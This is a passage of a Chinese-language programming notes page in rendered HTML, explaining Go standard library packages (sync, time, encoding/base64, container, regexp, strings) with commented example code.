opsFinal)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 `state` 使用一个最终的锁，显示它是如何结束的。</span></span><br><span class="line">    mutex.Lock()</span><br><span class="line">    fmt.Println(<span class="string">"state:"</span>, state)</span><br><span class="line">    mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读写锁-RWMutex"><a href="#读写锁-RWMutex" class="headerlink" title="读写锁 RWMutex"></a>读写锁 RWMutex</h3><h3 id="Once"><a href="#Once" class="headerlink" title="Once"></a>Once</h3><p>调用无数次也只执行一次。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line">onceBody := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(time.Now())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        once.Do(onceBody)</span><br><span class="line">        done &lt;- <span class="literal">true</span></span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    fmt.Println(&lt;- done)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WaitGroup"><a href="#WaitGroup" class="headerlink" title="WaitGroup"></a>WaitGroup</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A WaitGroup must not be copied after first use.</span></span><br><span class="line"><span class="comment">// 传给 goroutine 时需要传指针</span></span><br><span class="line">wg := sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line">wg.Add(<span class="number">10</span>)  <span class="comment">// 创建 goroutine 时添加</span></span><br><span class="line">wg.Done()  <span class="comment">// goroutine 对应的函数运行结束后调用 Done</span></span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br></pre></td></tr></table></figure><h3 id="竞争条件检测"><a href="#竞争条件检测" class="headerlink" title="竞争条件检测"></a>竞争条件检测</h3><p>go build，go run 或者 go test 命令后面加上 -race</p><h2 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a>常用库</h2><h3 id="os"><a href="#os" class="headerlink" title="os"></a>os</h3><p>尽量多用 os 提供的方法，这里的方法都是跨平台的，少用 syscall。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">daysBetweenDates</span><span class="params">(date1 <span class="keyword">string</span>, date2 <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    d1, _ := time.Parse(<span class="string">"2006-01-02"</span>, date1)</span><br><span class="line">    d2, _ := time.Parse(<span class="string">"2006-01-02"</span>, date2)</span><br><span class="line">    delta := d1.Sub(d2)</span><br><span class="line">    <span class="keyword">return</span> abs(<span class="keyword">int</span>(delta.Hours()) / <span class="number">24</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    timeString := time.Now().Format(<span class="string">"2006-01-02 15:04:05"</span>)  <span class="comment">// 这是一个神奇的时间，改了就错</span></span><br><span class="line">    fmt.Println(timeString)</span><br><span class="line">    fmt.Println(time.Now().Format(<span class="string">"2017-09-07 18:05:32"</span>))</span><br><span class="line">    </span><br><span class="line">    p := fmt.Println</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 得到当前时间。</span></span><br><span class="line">    now := time.Now()</span><br><span class="line">    p(now)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过提供年月日等信息，你可以构建一个 `time`。时间总是关联着位置信息，例如时区。</span></span><br><span class="line">    then := time.Date(<span class="number">2009</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">34</span>, <span class="number">58</span>, <span class="number">651387237</span>, time.UTC)</span><br><span class="line">    p(then)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 你可以提取出时间的各个组成部分。</span></span><br><span class="line">    p(then.Year())</span><br><span class="line">    p(then.Month())</span><br><span class="line">    p(then.Day())</span><br><span class="line">    p(then.Hour())</span><br><span class="line">    p(then.Minute())</span><br><span class="line">    p(then.Second())</span><br><span class="line">    p(then.Nanosecond())</span><br><span class="line">    p(then.Location())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出是星期一到日的 `Weekday` 也是支持的。</span></span><br><span class="line">    p(then.Weekday())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这些方法来比较两个时间，分别测试一下是否是之前，之后或者是同一时刻，精确到秒。</span></span><br><span class="line">    p(then.Before(now))</span><br><span class="line">    p(then.After(now))</span><br><span class="line">    p(then.Equal(now))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法 `Sub` 返回一个 `Duration` 来表示两个时间点的间隔时间。</span></span><br><span class="line">    diff := now.Sub(then)</span><br><span class="line">    p(diff)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们计算出不同单位下的时间长度值。</span></span><br><span class="line">    p(diff.Hours())</span><br><span class="line">    p(diff.Minutes())</span><br><span class="line">    p(diff.Seconds())</span><br><span class="line">    p(diff.Nanoseconds())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 你可以使用 `Add` 将时间后移一个时间间隔，或者使用一个 `-` 来将时间前移一个时间间隔。</span></span><br><span class="line">    p(then.Add(diff))</span><br><span class="line">    p(then.Add(-diff))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定时器-Timers"><a href="#定时器-Timers" class="headerlink" title="定时器 Timers"></a>定时器 Timers</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">timer = time.NewTimer(time.Second * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    &lt;-timer.C  <span class="comment">// 等待信号</span></span><br><span class="line">    <span class="comment">// xxx</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">timer.Stop()  <span class="comment">// 关掉定时器</span></span><br></pre></td></tr></table></figure><h4 id="打点器-Tickers"><a href="#打点器-Tickers" class="headerlink" title="打点器 Tickers"></a>打点器 Tickers</h4><p>间隔一段时间发一个信号。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ticker := time.NewTicker(time.Millisecond * <span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> t := <span class="keyword">range</span>.ticker.C &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Tick at "</span>, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">ticker.Stop()</span><br></pre></td></tr></table></figure><h4 id="速率限制-Rate-Limiting"><a href="#速率限制-Rate-Limiting" class="headerlink" title="速率限制 Rate Limiting"></a>速率限制 Rate Limiting</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 首先我们将看一下基本的速率限制。假设我们想限制我们</span></span><br><span class="line">    <span class="comment">// 接收请求的处理，我们将这些请求发送给一个相同的通道。</span></span><br><span class="line">    requests := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        requests &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(requests)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个 `limiter` 通道将每 200ms 接收一个值。这个是</span></span><br><span class="line">    <span class="comment">// 速率限制任务中的管理器。</span></span><br><span class="line">    limiter := time.Tick(time.Millisecond * <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过在每次请求前阻塞 `limiter` 通道的一个接收，我们限制</span></span><br><span class="line">    <span class="comment">// 自己每 200ms 执行一次请求。</span></span><br><span class="line">    <span class="keyword">for</span> req := <span class="keyword">range</span> requests &#123;</span><br><span class="line">        &lt;-limiter</span><br><span class="line">        fmt.Println(<span class="string">"request"</span>, req, time.Now())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有时候我们想临时进行速率限制，并且不影响整体的速率控制，</span></span><br><span class="line">    <span class="comment">// 我们可以通过[通道缓冲](channel-buffering.html)来实现。</span></span><br><span class="line">    <span class="comment">// 这个 `burstyLimiter` 通道用来进行 3 次临时的脉冲型速率限制。</span></span><br><span class="line">    burstyLimiter := <span class="built_in">make</span>(<span class="keyword">chan</span> time.Time, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 想将通道填充需要临时改变3次的值，做好准备。</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">        burstyLimiter &lt;- time.Now()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每 200 ms 我们将添加一个新的值到 `burstyLimiter`中，</span></span><br><span class="line">    <span class="comment">// 直到达到 3 个的限制。</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> t := <span class="keyword">range</span> time.Tick(time.Millisecond * <span class="number">200</span>) &#123;</span><br><span class="line">            burstyLimiter &lt;- t</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在模拟超过 5 个的接入请求。它们中刚开始的 3 个将</span></span><br><span class="line">    <span class="comment">// 由于受 `burstyLimiter` 的“脉冲”影响。</span></span><br><span class="line">    burstyRequests := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        burstyRequests &lt;- i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(burstyRequests)</span><br><span class="line">    <span class="keyword">for</span> req := <span class="keyword">range</span> burstyRequests &#123;</span><br><span class="line">        &lt;-burstyLimiter</span><br><span class="line">        fmt.Println(<span class="string">"request"</span>, req, time.Now())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> b64 <span class="string">"encoding/base64"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是将要编解码的字符串。</span></span><br><span class="line">    data := <span class="string">"abc123!?$*&amp;()'-=@~"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Go 同时支持标准的和 URL 兼容的 base64 格式。编码需要</span></span><br><span class="line">    <span class="comment">// 使用 `[]byte` 类型的参数，所以要将字符串转成此类型。</span></span><br><span class="line">    sEnc := b64.StdEncoding.EncodeToString([]<span class="keyword">byte</span>(data))</span><br><span class="line">    fmt.Println(sEnc)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解码可能会返回错误，如果不确定输入信息格式是否正确，</span></span><br><span class="line">    <span class="comment">// 那么，你就需要进行错误检查了。</span></span><br><span class="line">    sDec, _ := b64.StdEncoding.DecodeString(sEnc)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(sDec))</span><br><span class="line">    fmt.Println()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 URL 兼容的 base64 格式进行编解码。</span></span><br><span class="line">    uEnc := b64.URLEncoding.EncodeToString([]<span class="keyword">byte</span>(data))</span><br><span class="line">    fmt.Println(uEnc)</span><br><span class="line">    uDec, _ := b64.URLEncoding.DecodeString(uEnc)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(uDec))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="container"><a href="#container" class="headerlink" title="container"></a>container</h3><h4 id="heap-1"><a href="#heap-1" class="headerlink" title="heap"></a>heap</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> IntHeap []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span></span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(h) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Less</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123; <span class="keyword">return</span> h[i] &lt; h[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h IntHeap)</span> <span class="title">Swap</span><span class="params">(i, j <span class="keyword">int</span>)</span></span>      &#123; h[i], h[j] = h[j], h[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Push</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    *h = <span class="built_in">append</span>(*h, x.(<span class="keyword">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *IntHeap)</span> <span class="title">Pop</span><span class="params">()</span> <span class="title">interface</span></span>&#123;&#125; &#123;</span><br><span class="line">    old := *h</span><br><span class="line">    n := <span class="built_in">len</span>(old)</span><br><span class="line">    x := old[n<span class="number">-1</span>]</span><br><span class="line">    *h = old[<span class="number">0</span> : n<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h := &amp;IntHeap&#123;<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>&#125;</span><br><span class="line">heap.Init(h)</span><br><span class="line">heap.Push(h, <span class="number">3</span>)</span><br><span class="line">heap.Pop(h)</span><br></pre></td></tr></table></figure><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Element <span class="keyword">struct</span> &#123;</span><br><span class="line">    next, prev *Element  <span class="comment">// 上一个元素和下一个元素</span></span><br><span class="line">    list *List  <span class="comment">// 元素所在链表</span></span><br><span class="line">    Value <span class="keyword">interface</span>&#123;&#125;  <span class="comment">// 元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> List <span class="keyword">struct</span> &#123;</span><br><span class="line">    root Element  <span class="comment">// 链表的根元素</span></span><br><span class="line">    <span class="built_in">len</span>  <span class="keyword">int</span>      <span class="comment">// 链表的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"container/list"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    list := list.New()</span><br><span class="line">    list.PushBack(<span class="number">1</span>)</span><br><span class="line">    list.PushBack(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"len: %v\n"</span>, list.Len())</span><br><span class="line">    fmt.Printf(<span class="string">"first: %#v\n"</span>, list.Front())</span><br><span class="line">    fmt.Printf(<span class="string">"second: %#v\n"</span>, list.Front().Next())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Element</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="params">(e *Element)</span> <span class="title">Next</span><span class="params">()</span> *<span class="title">Element</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(e *Element)</span> <span class="title">Prev</span><span class="params">()</span> *<span class="title">Element</span></span></span><br><span class="line"><span class="function"><span class="title">type</span> <span class="title">List</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="title">New</span><span class="params">()</span> *<span class="title">List</span></span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">Back</span><span class="params">()</span> *<span class="title">Element</span>   // 最后一个元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">Front</span><span class="params">()</span> *<span class="title">Element</span>  // 第一个元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">Init</span><span class="params">()</span> *<span class="title">List</span>  // 链表初始化</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">InsertAfter</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, mark *Element)</span> *<span class="title">Element</span> // 在某个元素后插入</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">InsertBefore</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;, mark *Element)</span> *<span class="title">Element</span>  // 在某个元素前插入</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span> // 在链表长度</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">MoveAfter</span><span class="params">(e, mark *Element)</span>  // 把 <span class="title">e</span> 元素移动到 <span class="title">mark</span> 之后</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">MoveBefore</span><span class="params">(e, mark *Element)</span>  // 把 <span class="title">e</span> 元素移动到 <span class="title">mark</span> 之前</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">MoveToBack</span><span class="params">(e *Element)</span> // 把 <span class="title">e</span> 元素移动到队列最后</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">MoveToFront</span><span class="params">(e *Element)</span> // 把 <span class="title">e</span> 元素移动到队列最头部</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">PushBack</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> *<span class="title">Element</span>  // 在队列最后插入元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">PushBackList</span><span class="params">(other *List)</span>  // 在队列最后插入接上新队列</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">PushFront</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span> *<span class="title">Element</span>  // 在队列头部插入元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">PushFrontList</span><span class="params">(other *List)</span> // 在队列头部插入接上新队列</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(l *List)</span> <span class="title">Remove</span><span class="params">(e *Element)</span> <span class="title">interface</span></span>&#123;&#125; <span class="comment">// 删除某个元素</span></span><br></pre></td></tr></table></figure><h4 id="ring"><a href="#ring" class="headerlink" title="ring"></a>ring</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type Ring struct &#123;</span><br><span class="line">    next, prev *Ring</span><br><span class="line">    Value      interface&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"container/ring"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ring := ring.New(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">3</span>; i++ &#123;</span><br><span class="line">        ring.Value = i</span><br><span class="line">        ring = ring.Next()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 1+2+3</span></span><br><span class="line">    s := <span class="number">0</span></span><br><span class="line">    ring.Do(<span class="function"><span class="keyword">func</span><span class="params">(p <span class="keyword">interface</span>&#123;&#125;)</span></span>&#123;</span><br><span class="line">        s += p.(<span class="keyword">int</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    fmt.Println(<span class="string">"sum is"</span>, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Ring</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(n <span class="keyword">int</span>)</span> *<span class="title">Ring</span>  // 初始化环</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Do</span><span class="params">(f <span class="keyword">func</span>(<span class="keyword">interface</span>&#123;&#125;)</span>)  // 循环环进行操作</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Len</span><span class="params">()</span> <span class="title">int</span> // 环长度</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Link</span><span class="params">(s *Ring)</span> *<span class="title">Ring</span> // 连接两个环</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Move</span><span class="params">(n <span class="keyword">int</span>)</span> *<span class="title">Ring</span> // 指针从当前元素开始向后移动或者向前（<span class="title">n</span> 可以为负数）</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Next</span><span class="params">()</span> *<span class="title">Ring</span> // 当前元素的下个元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Prev</span><span class="params">()</span> *<span class="title">Ring</span> // 当前元素的上个元素</span></span><br><span class="line"><span class="function">    <span class="title">func</span> <span class="params">(r *Ring)</span> <span class="title">Unlink</span><span class="params">(n <span class="keyword">int</span>)</span> *<span class="title">Ring</span> // 从当前元素开始，删除 <span class="title">n</span> 个元素</span></span><br></pre></td></tr></table></figure><h3 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"bytes"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"regexp"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个测试一个字符串是否符合一个表达式。</span></span><br><span class="line">    match, _ := regexp.MatchString(<span class="string">"p([a-z]+)ch"</span>, <span class="string">"peach"</span>)</span><br><span class="line">    fmt.Println(match)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上面我们是直接使用字符串，但是对于一些其他的正则任</span></span><br><span class="line">    <span class="comment">// 务，你需要 `Compile` 一个优化的 `Regexp` 结构体。</span></span><br><span class="line">    r, _ := regexp.Compile(<span class="string">"p([a-z]+)ch"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个结构体有很多方法。这里是类似我们前面看到的一个</span></span><br><span class="line">    <span class="comment">// 匹配测试。</span></span><br><span class="line">    fmt.Println(r.MatchString(<span class="string">"peach"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是查找匹配字符串的。</span></span><br><span class="line">    fmt.Println(r.FindString(<span class="string">"peach punch"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个也是查找第一次匹配的字符串的，但是返回的匹配开</span></span><br><span class="line">    <span class="comment">// 始和结束位置索引，而不是匹配的内容。</span></span><br><span class="line">    fmt.Println(r.FindStringIndex(<span class="string">"peach punch"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `Submatch` 返回完全匹配和局部匹配的字符串。例如，</span></span><br><span class="line">    <span class="comment">// 这里会返回 `p([a-z]+)ch` 和 `([a-z]+) 的信息。</span></span><br><span class="line">    fmt.Println(r.FindStringSubmatch(<span class="string">"peach punch"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类似的，这个会返回完全匹配和局部匹配的索引位置。</span></span><br><span class="line">    fmt.Println(r.FindStringSubmatchIndex(<span class="string">"peach punch"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带 `All` 的这个函数返回所有的匹配项，而不仅仅是首</span></span><br><span class="line">    <span class="comment">// 次匹配项。例如查找匹配表达式的所有项。</span></span><br><span class="line">    fmt.Println(r.FindAllString(<span class="string">"peach punch pinch"</span>, <span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `All` 同样可以对应到上面的所有函数。</span></span><br><span class="line">    fmt.Println(r.FindAllStringSubmatchIndex(</span><br><span class="line">        <span class="string">"peach punch pinch"</span>, <span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个函数提供一个正整数来限制匹配次数。</span></span><br><span class="line">    fmt.Println(r.FindAllString(<span class="string">"peach punch pinch"</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 上面的例子中，我们使用了字符串作为参数，并使用了</span></span><br><span class="line">    <span class="comment">// 如 `MatchString` 这样的方法。我们也可以提供 `[]byte`</span></span><br><span class="line">    <span class="comment">// 参数并将 `String` 从函数命中去掉。</span></span><br><span class="line">    fmt.Println(r.Match([]<span class="keyword">byte</span>(<span class="string">"peach"</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建正则表达式常量时，可以使用 `Compile` 的变体</span></span><br><span class="line">    <span class="comment">// `MustCompile` 。因为 `Compile` 返回两个值，不能用于常量。</span></span><br><span class="line">    r = regexp.MustCompile(<span class="string">"p([a-z]+)ch"</span>)</span><br><span class="line">    fmt.Println(r)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `regexp` 包也可以用来替换部分字符串为其他值。</span></span><br><span class="line">    fmt.Println(r.ReplaceAllString(<span class="string">"a peach"</span>, <span class="string">"&lt;fruit&gt;"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// `Func` 变量允许传递匹配内容到一个给定的函数中，</span></span><br><span class="line">    in := []<span class="keyword">byte</span>(<span class="string">"a peach"</span>)</span><br><span class="line">    out := r.ReplaceAllFunc(in, bytes.ToUpper)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Compare</span><span class="params">(a, b <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Contains</span><span class="params">(s, substr <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ContainsAny</span><span class="params">(s, chars <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">ContainsRune</span><span class="params">(s <span class="keyword">string</span>, r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Count</span><span class="params">(s, substr <span class="keyword">string</span>)</span> <span class="title">int</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">EqualFold</span><span class="params">(s, t <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Fields</span><span class="params">(s <span class="keyword">string</span>)</span> []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">FieldsFunc</span><span class="params">(s <span class="keyword">string</span>, f <span class="keyword">func</span>(<span class="keyword">rune</span>)</span> <span class="title">bool</span>) []<span class="title">string</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">HasPrefix</span><span class="params">(s, prefix <span class="keyword">string</span>)</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> 